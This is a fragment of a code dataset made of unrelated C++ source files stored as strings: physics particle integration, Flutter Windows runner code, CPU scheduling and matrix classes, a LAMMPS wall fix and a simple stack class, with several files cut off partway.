testing::ExitedWithCode(0),\n            \"\");\n\n    clopts::parse_clopts(argc1, argv1);\n    EXPECT_TRUE(clopts::code);\n    EXPECT_FALSE(clopts::file_name);\n}\n\n}",
    "/*\r\n * Implementation file for the particle class.\r\n *\r\n * Part of the Cyclone physics system.\r\n *\r\n * Copyright (c) Icosagon 2003. All Rights Reserved.\r\n *\r\n * This software is distributed under licence. Use of this software\r\n * implies agreement with all terms and conditions of the accompanying\r\n * software licence.\r\n */\r\n\r\n#include <assert.h>\r\n#include <particle.h>\r\n\r\nusing namespace cyclone;\r\n\r\n\r\n/*\r\n * --------------------------------------------------------------------------\r\n * FUNCTIONS DECLARED IN HEADER:\r\n * --------------------------------------------------------------------------\r\n */\r\n\r\nvoid Particle::integrate(real duration)\r\n{\r\n    // We don't integrate things with zero mass.\r\n    if (inverseMass <= 0.0f) return;\r\n\r\n    assert(duration > 0.0);\r\n\r\n    // Update linear position.\r\n    position.addScaledVector(velocity, duration);\r\n\r\n    // Work out the acceleration from the force\r\n    Vector3 resultingAcc = acceleration;\r\n    resultingAcc.addScaledVector(forceAccum, inverseMass);\r\n\r\n    // Update linear velocity from the acceleration.\r\n    velocity.addScaledVector(resultingAcc, duration);\r\n\r\n    // Impose drag.\r\n    velocity *= real_pow(damping, duration);\r\n\r\n    // Clear the forces.\r\n    clearAccumulator();\r\n}\r\n\r\n\r\n\r\nvoid Particle::setMass(const real mass)\r\n{\r\n    assert(mass != 0);\r\n    Particle::inverseMass = ((real)1.0)/mass;\r\n}\r\n\r\nreal Particle::getMass() const\r\n{\r\n    if (inverseMass == 0) {\r\n        return REAL_MAX;\r\n    } else {\r\n        return ((real)1.0)/inverseMass;\r\n    }\r\n}\r\n\r\nvoid Particle::setInverseMass(const real inverseMass)\r\n{\r\n    Particle::inverseMass = inverseMass;\r\n}\r\n\r\nreal Particle::getInverseMass() const\r\n{\r\n    return inverseMass;\r\n}\r\n\r\nbool Particle::hasFiniteMass() const\r\n{\r\n    return inverseMass >= 0.0f;\r\n}\r\n\r\nvoid Particle::setDamping(const real damping)\r\n{\r\n    Particle::damping = damping;\r\n}\r\n\r\nreal Particle::getDamping() const\r\n{\r\n    return damping;\r\n}\r\n\r\nvoid Particle::setPosition(const Vector3 &position)\r\n{\r\n    Particle::position = position;\r\n}\r\n\r\nvoid Particle::setPosition(const real x, const real y, const real z)\r\n{\r\n    position.x = x;\r\n    position.y = y;\r\n    position.z = z;\r\n}\r\n\r\nvoid Particle::getPosition(Vector3 *position) const\r\n{\r\n    *position = Particle::position;\r\n}\r\n\r\nVector3 Particle::getPosition() const\r\n{\r\n    return position;\r\n}\r\n\r\nvoid Particle::setVelocity(const Vector3 &velocity)\r\n{\r\n    Particle::velocity = velocity;\r\n}\r\n\r\nvoid Particle::setVelocity(const real x, const real y, const real z)\r\n{\r\n    velocity.x = x;\r\n    velocity.y = y;\r\n    velocity.z = z;\r\n}\r\n\r\nvoid Particle::getVelocity(Vector3 *velocity) const\r\n{\r\n    *velocity = Particle::velocity;\r\n}\r\n\r\nVector3 Particle::getVelocity() const\r\n{\r\n    return velocity;\r\n}\r\n\r\nvoid Particle::setAcceleration(const Vector3 &acceleration)\r\n{\r\n    Particle::acceleration = acceleration;\r\n}\r\n\r\nvoid Particle::setAcceleration(const real x, const real y, const real z)\r\n{\r\n    acceleration.x = x;\r\n    acceleration.y = y;\r\n    acceleration.z = z;\r\n}\r\n\r\nvoid Particle::getAcceleration(Vector3 *acceleration) const\r\n{\r\n    *acceleration = Particle::acceleration;\r\n}\r\n\r\nVector3 Particle::getAcceleration() const\r\n{\r\n    return acceleration;\r\n}\r\n\r\nvoid Particle::clearAccumulator()\r\n{\r\n    forceAccum.clear();\r\n}\r\n\r\nvoid Particle::addForce(const Vector3 &force)\r\n{\r\n    forceAccum += force;\r\n}\r\n",
    "//\n// Created by solarbaron on 2.4.24.\n//\n\n#include \"fancy_border.h\"\n\nvoid printBorder(const std::string& text) {\n    // UTF-8 characters for the border\n    const char* topLeft = \"\\u250C\"; // \u250c\n    const char* topRight = \"\\u2510\"; // \u2510\n    const char* bottomLeft = \"\\u2514\"; // \u2514\n    const char* bottomRight = \"\\u2518\"; // \u2518\n    const char* horizontal = \"\\u2500\"; // \u2500\n    const char* vertical = \"\\u2502\"; // \u2502\n\n    std::istringstream stream(text);\n    std::string line;\n    std::vector<std::string> lines;\n    size_t maxLength = 0;\n    while (std::getline(stream, line)) {\n        lines.push_back(line);\n        if (line.length() > maxLength) {\n            maxLength = line.length();\n        }\n    }\n\n    // Calculate the width for the border based on the text length\n    int width = maxLength + 2; // Adding space for padding\n\n    // Print top border\n    std::cout << topLeft;\n    for (size_t i = 0; i < width; i++) std::cout << horizontal;\n    std::cout << topRight << std::endl;\n\n    //rewrite\n\n    //printw(topLeft\"\\n\");\n    //for (size_t i = 0; i < width; i++) printw(horizontal,\"\\n\");;\n    //printw(topRight,\"\\n\");\n\n    for (const auto& l : lines) {\n        std::cout << vertical << \" \" << l;\n        // Print spaces if the line is shorter than the longest line\n        for (size_t i = l.length(); i < maxLength; i++) {\n            std::cout << \" \";\n        }\n        std::cout << \" \" << vertical << std::endl;\n    }\n\n    // Print bottom border\n    std::cout << bottomLeft;\n    for (size_t i = 0; i < width; i++) std::cout << horizontal;\n    std::cout << bottomRight << std::endl;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\r\n#include <vector>\r\nusing namespace std;\r\n\r\nvoid findWaitingTime(int processes[], int n, int bt[], int wt[]) {\r\n    wt[0] = 0;\r\n    for (int i = 1; i < n; i++) {\r\n        wt[i] = bt[i - 1] + wt[i - 1];\r\n    }\r\n}\r\n\r\nvoid findturnAroundTime(int processes[], int n, int bt[], int wt[], int tat[]) {\r\n    for (int i = 0; i < n; i++) {\r\n        tat[i] = bt[i] + wt[i];\r\n    }\r\n}\r\n\r\nvoid findAverageTime(int processes[], int n, int burst_time[]) {\r\n    int wt[n], tat[n], total_wt = 0, total_tat = 0;\r\n    findWaitingTime(processes, n, burst_time, wt);\r\n    findturnAroundTime(processes, n, burst_time, wt, tat);\r\n    cout << \"Processes\\tBurst Time\\tWaiting Time\\tTurn Around Time\\n\";\r\n    for (int i = 0; i < n; i++) {\r\n        total_wt += wt[i];\r\n        total_tat += tat[i];\r\n        cout << \" \" << processes[i] << \"\\t\\t\" << burst_time[i] << \"\\t\\t\" << wt[i] << \"\\t\\t\" << tat[i] << endl;\r\n    }\r\n}\r\n\r\nint main() {\r\n    int processes[] = {1, 2, 3, 4};\r\n    int n = sizeof(processes) / sizeof(processes[0]);\r\n    int burst_time[] = {21, 3, 6, 2};\r\n    findAverageTime(processes, n, burst_time);\r\n    return 0;\r\n}",
    "#include <bits/stdc++.h>\r\n#include <ext/pb_ds/assoc_container.hpp>\r\n#include <ext/pb_ds/tree_policy.hpp>\r\n\r\nusing namespace std;\r\nusing namespace __gnu_pbds;\r\n\r\n#define ull unsigned long long int\r\n#define ld long double\r\n#define ll long long\r\n#define PI acos(-1)\r\n#define endl \"\\n\"\r\n#define all(x) x.begin(), x.end()\r\n#define fixed(n) cout << fixed << setprecision(n)\r\n#define loop(i, n) for (int i = 0; i < (int)n; i++)\r\n\r\nconst int OO = 0x3f3f3f3f;\r\nconst int N = 1e5 + 7;\r\nint dx[] = {1, -1, 0, 0};\r\nint dy[] = {0, 0, 1, -1};\r\n\r\nvoid Ahmed_Faraj()\r\n{\r\n    ios_base::sync_with_stdio(false);\r\n    cin.tie(nullptr);\r\n    cout.tie(nullptr);\r\n#ifndef ONLINE_JUDGE\r\n    freopen(\"input.txt\", \"r\", stdin);\r\n    freopen(\"output.txt\", \"w\", stdout);\r\n#endif\r\n}\r\n\r\nvoid solve()\r\n{\r\n    ll n, m;\r\n    cin >> n >> m;\r\n    vector<ll> v(n, 3);\r\n    ll rel[m][2] = {0};\r\n    for (size_t i = 0; i < m; i++)\r\n    {\r\n        cin >> rel[i][0] >> rel[i][1];\r\n    }\r\n    v[0] = 1;\r\n    for (ll i = 0; i < m; i++)\r\n    {\r\n        if (rel[i][0] == 1 || rel[i][1] == 1)\r\n        {\r\n            v[rel[i][0] - 1] = 1;\r\n            v[rel[i][1] - 1] = 1;\r\n        }\r\n        else\r\n        {\r\n            // cout << v[rel[i][0] - 1] << \" \" << v[rel[i][1] - 1] << \" \";\r\n            if (v[rel[i][0] - 1] < v[rel[i][1] - 1])\r\n            {\r\n                v[rel[i][1] - 1] = min(v[rel[i][1] - 1], v[rel[i][0] - 1] + 1);\r\n            }\r\n            else\r\n            {\r\n                v[rel[i][0] - 1] = min(v[rel[i][0] - 1], v[rel[i][1] - 1] + 1);\r\n            }\r\n        }\r\n    }\r\n    for (ll i = 0; i < m; i++)\r\n    {\r\n        if (rel[i][0] == 1 || rel[i][1] == 1)\r\n        {\r\n            v[rel[i][0] - 1] = 1;\r\n            v[rel[i][1] - 1] = 1;\r\n        }\r\n        else\r\n        {\r\n            // cout << v[rel[i][0] - 1] << \" \" << v[rel[i][1] - 1] << \" \";\r\n            if (v[rel[i][0] - 1] < v[rel[i][1] - 1])\r\n            {\r\n                v[rel[i][1] - 1] = min(v[rel[i][1] - 1], v[rel[i][0] - 1] + 1);\r\n            }\r\n            else\r\n            {\r\n                v[rel[i][0] - 1] = min(v[rel[i][0] - 1], v[rel[i][1] - 1] + 1);\r\n            }\r\n        }\r\n    }\r\n    for (size_t i = 1; i < n; i++)\r\n    {\r\n        if (v[i] == 1)\r\n        {\r\n            cout << \"1st\" << endl;\r\n        }\r\n        else if (v[i] == 2)\r\n        {\r\n            cout << \"2nd\" << endl;\r\n        }\r\n        else\r\n        {\r\n            cout << \"3rd\" << endl;\r\n        }\r\n    }\r\n}\r\n\r\nsigned main()\r\n{\r\n    Ahmed_Faraj();\r\n    // fast();\r\n    ll test = 1;\r\n    // cin >> test;\r\n    while (test--)\r\n    {\r\n        solve();\r\n    }\r\n    return 0;\r\n}",
    "/* ----------------------------------------------------------------------\n   LAMMPS - Large-scale Atomic/Molecular Massively Parallel Simulator\n   http://lammps.sandia.gov, Sandia National Laboratories\n   Steve Plimpton, sjplimp@sandia.gov\n\n   Copyright (2003) Sandia Corporation.  Under the terms of Contract\n   DE-AC04-94AL85000 with Sandia Corporation, the U.S. Government retains\n   certain rights in this software.  This software is distributed under\n   the GNU General Public License.\n\n   See the README file in the top-level LAMMPS directory.\n\n   Modified by Olav Galteland, olav.galteland@ntnu.no\n   Reflective particle method: 10.1103/PhysRevE.57.7259\n------------------------------------------------------------------------- */\n\n#include <stdlib.h>\n#include <string.h>\n#include \"fix_wall_rpm.h\"\n#include \"atom.h\"\n#include \"comm.h\"\n#include \"update.h\"\n#include \"modify.h\"\n#include \"domain.h\"\n#include \"lattice.h\"\n#include \"input.h\"\n#include \"variable.h\"\n#include \"error.h\"\n#include \"force.h\"\n\nusing namespace LAMMPS_NS;\nusing namespace FixConst;\n\nenum{XLO=0,XHI=1,YLO=2,YHI=3,ZLO=4,ZHI=5};\nenum{NONE=0,EDGE,CONSTANT,VARIABLE};\n\n/* ---------------------------------------------------------------------- */\n\nFixWallRPM::FixWallRPM(LAMMPS *lmp, int narg, char **arg) :\n  Fix(lmp, narg, arg),\n  nwall(0),\n  rng(lmp, 987334)\n{\n  if (narg < 4) error->all(FLERR,\"Illegal fix wall/rpm command\");\n\n  // parse args\n\n  nwall = 0;\n  int scaleflag = 1;\n  //p = atof(arg[3]);\n\n  int iarg = 3;\n  while (iarg < narg) {\n    if ((strcmp(arg[iarg],\"xlo\") == 0) || (strcmp(arg[iarg],\"xhi\") == 0) ||\n        (strcmp(arg[iarg],\"ylo\") == 0) || (strcmp(arg[iarg],\"yhi\") == 0) ||\n        (strcmp(arg[iarg],\"zlo\") == 0) || (strcmp(arg[iarg],\"zhi\") == 0)) {\n      if (iarg+3 > narg) error->all(FLERR,\"Illegal fix wall/rpm command\");\n\n      int newwall;\n      if (strcmp(arg[iarg],\"xlo\") == 0) newwall = XLO;\n      else if (strcmp(arg[iarg],\"xhi\") == 0) newwall = XHI;\n      else if (strcmp(arg[iarg],\"ylo\") == 0) newwall = YLO;\n      else if (strcmp(arg[iarg],\"yhi\") == 0) newwall = YHI;\n      else if (strcmp(arg[iarg],\"zlo\") == 0) newwall = ZLO;\n      else if (strcmp(arg[iarg],\"zhi\") == 0) newwall = ZHI;\n\n      for (int m = 0; (m < nwall) && (m < 6); m++)\n        if (newwall == wallwhich[m])\n          error->all(FLERR,\"Wall defined twice in fix wall/rpm command\");\n\n      wallwhich[nwall] = newwall;\n      if (strcmp(arg[iarg+1],\"EDGE\") == 0) {\n        wallstyle[nwall] = EDGE;\n        int dim = wallwhich[nwall] / 2;\n        int side = wallwhich[nwall] % 2;\n        if (side == 0) coord0[nwall] = domain->boxlo[dim];\n        else coord0[nwall] = domain->boxhi[dim];\n      } else if (strstr(arg[iarg+1],\"v_\") == arg[iarg+1]) {\n        wallstyle[nwall] = VARIABLE;\n        int n = strlen(&arg[iarg+1][2]) + 1;\n        varstr[nwall] = new char[n];\n        strcpy(varstr[nwall],&arg[iarg+1][2]);\n      } else {\n        wallstyle[nwall] = CONSTANT;\n        coord0[nwall] = utils::numeric(FLERR,arg[iarg+1],false,lmp);\n      }\n        \n      // Only allow for one p TODO: One p for each wall\n      p = atof(arg[iarg+2]);\n      nwall++;\n      iarg += 3;\n\n    } else if (strcmp(arg[iarg],\"units\") == 0) {\n      if (iarg+2 > narg) error->all(FLERR,\"Illegal wall/rpm command\");\n      if (strcmp(arg[iarg+1],\"box\") == 0) scaleflag = 0;\n      else if (strcmp(arg[iarg+1],\"lattice\") == 0) scaleflag = 1;\n      else error->all(FLERR,\"Illegal fix wall/rpm command\");\n      iarg += 2;\n    } else error->all(FLERR,\"Illegal fix wall/rpm command\");\n  }\n\n  // error check\n\n  if (nwall == 0) error->all(FLERR,\"Illegal fix wall command\");\n    \n  // Why not?\n  /*\n  for (int m = 0; m < nwall; m++) {\n    if ((wallwhich[m] == XLO || wallwhich[m] == XHI) && domain->xperiodic)\n      error->all(FLERR,\"Cannot use fix wall/rpm in periodic dimension\");\n    if ((wallwhich[m] == YLO || wallwhich[m] == YHI) && domain->yperiodic)\n      error->all(FLERR,\"Cannot use fix wall/rpm in periodic dimension\");\n    if ((wallwhich[m] == ZLO || wallwhich[m] == ZHI) && domain->zperiodic)\n      error->all(FLERR,\"Cannot use fix wall/rpm in periodic dimension\");\n  }\n  */\n\n  for (int m = 0; m < nwall; m++)\n    if ((wallwhich[m] == ZLO || wallwhich[m] == ZHI) && domain->dimension == 2)\n      error->all(FLERR,\n                 \"Cannot use fix wall/rpm zlo/zhi for a 2d simulation\");\n\n  // scale factors for CONSTANT and VARIABLE walls\n\n  int flag = 0;\n  for (int m = 0; m < nwall; m++)\n    if (wallstyle[m] != EDGE) flag = 1;\n\n  if (flag) {\n    if (scaleflag) {\n      xscale = domain->lattice->xlattice;\n      yscale = domain->lattice->ylattice;\n      zscale = domain->lattice->zlattice;\n    }\n    else xscale = yscale = zscale = 1.0;\n\n    for (int m = 0; m < nwall; m++) {\n      if (wallstyle[m] != CONSTANT) continue;\n      if (wallwhich[m] < YLO) coord0[m] *= xscale;\n      else if (wallwhich[m] < ZLO) coord0[m] *= yscale;\n      else coord0[m] *= zscale;\n    }\n  }\n\n  // set varflag if any wall positions are variable\n\n  varflag = 0;\n  for (int m =",
    "#include \"s21_matrix_oop.h\"\n\nS21Matrix::S21Matrix() { ResetMatrix(); }\n\nS21Matrix::S21Matrix(int rows, int cols) {\n  if (rows > 0 && cols > 0) {\n    CreateMatrix(rows, cols);\n  } else {\n    throw std::invalid_argument(\"Cols and rows must be bigger than zero\");\n  }\n}\n\nS21Matrix::S21Matrix(const S21Matrix& other) {\n  CreateMatrix(other.rows_, other.cols_);\n  CopyMatrix(other.matrix_);\n}\n\nS21Matrix::S21Matrix(S21Matrix&& other) noexcept {\n  rows_ = other.rows_;\n  cols_ = other.cols_;\n  matrix_ = other.matrix_;\n  other.ResetMatrix();\n}\n\nS21Matrix::~S21Matrix() {\n  DeleteMatrix();\n  ResetMatrix();\n}\n\nbool S21Matrix::EqMatrix(const S21Matrix& other) {\n  bool res = true;\n  if (IsCorrectMatrixesSizes(other) && rows_ == other.rows_ &&\n      cols_ == other.cols_) {\n    for (int i = 0; i < rows_; i++) {\n      for (int j = 0; j < cols_; j++) {\n        if (fabs(matrix_[i][j] - other.matrix_[i][j]) > 1e-6) {\n          res = false;\n        }\n      }\n    }\n  } else {\n    res = false;\n  }\n  return res;\n}\n\nvoid S21Matrix::SumMatrix(const S21Matrix& other) {\n  if (IsCorrectMatrixesSizes(other)) {\n    if (rows_ == other.rows_ && cols_ == other.cols_) {\n      for (int i = 0; i < rows_; i++) {\n        for (int j = 0; j < cols_; j++) {\n          matrix_[i][j] += other.matrix_[i][j];\n        }\n      }\n    } else {\n      throw std::length_error(\"Lengths of matrixes is not equal\");\n    }\n  } else {\n    throw std::invalid_argument(\"Cols and rows must be bigger than zero\");\n  }\n}\n\nvoid S21Matrix::SubMatrix(const S21Matrix& other) {\n  if (IsCorrectMatrixesSizes(other)) {\n    if (rows_ == other.rows_ && cols_ == other.cols_) {\n      for (int i = 0; i < rows_; i++) {\n        for (int j = 0; j < cols_; j++) {\n          matrix_[i][j] -= other.matrix_[i][j];\n        }\n      }\n    } else {\n      throw std::length_error(\"Lengths of matrixes is not equal\");\n    }\n  } else {\n    throw std::invalid_argument(\"Cols and rows must be bigger than zero\");\n  }\n}\n\nvoid S21Matrix::MulNumber(const double num) {\n  if (IsCorrectMatrix_()) {\n    for (int i = 0; i < rows_; i++) {\n      for (int j = 0; j < cols_; j++) {\n        matrix_[i][j] *= num;\n      }\n    }\n  } else {\n    throw std::invalid_argument(\"Cols and rows must be bigger than zero\");\n  }\n}\n\nvoid S21Matrix::MulMatrix(const S21Matrix& other) {\n  if (IsCorrectMatrixesSizes(other)) {\n    if (rows_ == other.cols_ && cols_ == other.rows_) {\n      S21Matrix result(rows_, other.cols_);\n      for (int i = 0; i < rows_; i++) {\n        for (int j = 0; j < other.cols_; j++) {\n          for (int k = 0; k < cols_; ++k) {\n            result.matrix_[i][j] += matrix_[i][k] * other.matrix_[k][j];\n          }\n        }\n      }\n      *this = result;\n    } else {\n      throw std::length_error(\n          \"The number of columns of the first matrix is not equal to the \"\n          \"number of rows of the second matrix\");\n    }\n  } else {\n    throw std::invalid_argument(\"Cols and rows must be bigger than zero\");\n  }\n}\n\nS21Matrix S21Matrix::Transpose() {\n  if (IsCorrectMatrix_()) {\n    S21Matrix Transposed(cols_, rows_);\n\n    for (int i = 0; i < rows_; ++i) {\n      for (int j = 0; j < cols_; ++j) {\n        Transposed.matrix_[j][i] = matrix_[i][j];\n      }\n    }\n    return Transposed;\n  } else {\n    throw std::invalid_argument(\"Cols and rows must be bigger than zero\");\n  }\n}\n\nS21Matrix S21Matrix::CalcComplements() {\n  if (IsCorrectMatrix_()) {\n    if (rows_ == cols_) {\n      S21Matrix result(rows_, cols_);\n      S21Matrix minor(rows_ - 1, cols_ - 1);\n\n      for (int i = 0; i < rows_; i++) {\n        for (int j = 0; j < cols_; j++) {\n          minor = CreateMinor(i, j);\n          double minor_det = minor.Determinant();\n\n          double complement = minor_det * ((i + j) % 2 == 0 ? 1 : -1);\n          result(i, j) = complement;\n        }\n      }\n      return result;\n    } else {\n      throw std::invalid_argument(\"Matrix is now square\");\n    }\n  } else {\n    throw std::invalid_argument(\"Cols and rows must be bigger than zero\");\n  }\n}\n\ndouble S21Matrix::Determinant() {\n  double det = 0.0;\n\n  if (IsCorrectMatrix_()) {\n    if (rows_ == cols_) {\n      if (rows_ == 2) {\n        det = matrix_[0][0] * matrix_[1][1] - matrix_[0][1] * matrix_[1][0];\n      } else if (rows_ == 1) {\n        det = matrix_[0][0];\n      } else {\n        int N = rows_;\n        int sign = 1;\n        for (int i = 0; i < N; i++) {\n          S21Matrix minor(N - 1, N - 1);\n\n          for (int j = 0; j < N - 1; j++) {\n            for (int k = 0; k < N - 1; k++) {\n              minor.matrix_[j][k] = matrix_[j + 1][(k >= i) ? k + 1 : k];\n            }\n          }\n          double minor_det = minor.Determinant();\n\n          det += sign * matrix_[0][i] * minor_det;\n          sign = -sign;\n        }\n      }\n    } else {\n      throw std::invalid_argument(\"Matrix is now square\");\n    }\n  } else {\n    throw std::invalid_argument(\"Cols and rows must be bigger than zero\");\n  }\n  return det;\n}\n\nS21Matrix S21Matrix::InverseMatrix() {\n  double det = 0.0;\n\n  if (IsCorrectMatrix_())",
    "#include<iostream>\r\n\r\nusing namespace std;\r\n\r\n// ADT Cod\r\nclass stack\r\n{\r\n\tprivate:\r\n\t\tint *arr;\t// dynamic array\r\n\t\tint top;\t// Index pointing at top element.\r\n\t\tint n;\r\n\t\t\r\n\tpublic:\r\n\t\tstack(const int size=100)\r\n\t\t{\r\n\t\t\tarr = new int[n];\r\n\t\t\ttop = -1;\r\n\t\t\tn=size;\r\n\t\t}\r\n\t\t\r\n\t\t~stack()\r\n\t\t{\r\n\t\t\tdelete []arr;\r\n\t\t}\r\n\t\t\r\n\t\tvoid push(const int x)\r\n\t\t{\r\n\t\t\tif(top == n-1)\r\n\t\t\t{\r\n\t\t\t\tcout<<\"Stack overflow!\"<<endl;\r\n\t\t\t\treturn;\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\ttop++;\t\t// because top = -1 , while initialized.\r\n\t\t\tarr[top]=x;\r\n\t\t}\r\n\t\t\r\n\t\tint TOP()\r\n\t\t{\r\n\t\t\tif( top == -1)\r\n\t\t\t{\r\n\t\t\t\tcout<<\"No element in the stack!\"<<endl;\r\n\t\t\t\treturn -1;\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\treturn arr[top];\r\n\t\t}\r\n\t\t\r\n\t\tvoid pop()\r\n\t\t{\r\n\t\t\tif( top == -1 )\r\n\t\t\t{\r\n\t\t\t\tcout<<\"No element to pop ! \"<<endl;\r\n\t\t\t\treturn;\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\ttop--;\r\n\t\t\t\r\n\t\t}\r\n\t\t\r\n\t\tint empty() const\r\n\t\t{\r\n\t\t\treturn top==-1;\r\n\t\t}\r\n\t\t\r\n\t\tint size() const\r\n\t\t{\r\n\t\t\treturn top+1;\r\n\t\t}\r\n\r\n};\r\n\r\n//Client code\r\nint main()\r\n{\r\n\tstack s(3);\r\n\t\r\n\ts.push(1);\r\n\ts.push(2);\r\n\ts.push(3);\r\n\t\r\n\tcout<<\"Total elements in the stack : \"<<s.size()<<endl;\r\n\t\r\n\t// Displaying and emptying the stack : \r\n\twhile(!s.empty())\r\n\t{\r\n\t\tcout<<\"Top value : \"<<s.TOP()<<endl;\r\n\t\ts.pop();\r\n\t}\r\n\t\r\n\t\r\n\treturn 0;\r\n}\r\n\r\n",
